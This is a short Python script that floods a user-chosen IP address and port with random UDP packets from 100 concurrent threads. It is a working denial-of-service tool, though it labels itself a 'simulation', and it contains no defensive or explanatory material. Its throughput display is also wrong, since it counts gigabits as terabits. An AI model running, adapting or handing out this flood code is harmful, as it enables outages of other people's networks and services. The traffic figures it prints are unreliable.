import socket
import random
import threading
import time

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    RESET = "\033[0m"

target_ip = input(f"{Colors.YELLOW}Enter the target IP address: {Colors.RESET}")
target_port = int(input(f"{Colors.YELLOW}Enter the target port number: {Colors.RESET}"))

target_bandwidth = 10000000000  

packet_size = 3072  

def send_udp_packet():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    data_to_send = random._urandom(packet_size)  

    while True:
        udp_socket.sendto(data_to_send, (target_ip, target_port))  
        print(f"{Colors.GREEN}Packet sent: {target_ip}:{target_port}{Colors.RESET}", end='\r')


def flood_simulation(num_threads):
    threads = []
    total_sent = 0

    for _ in range(num_threads):
        thread = threading.Thread(target=send_udp_packet)
        threads.append(thread)
        thread.start()

   
    while total_sent < target_bandwidth:
        time.sleep(1) 
        total_sent += num_threads * packet_size * 8 / 1e9 
        print(f"{Colors.YELLOW}Total Sent: {total_sent:.2f} Tbit{Colors.RESET}", end='\r')

   
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    num_threads = 100  
    print(f"{Colors.RED}Starting UDP flood simulation with {num_threads} threads...{Colors.RESET}")
    flood_simulation(num_threads)
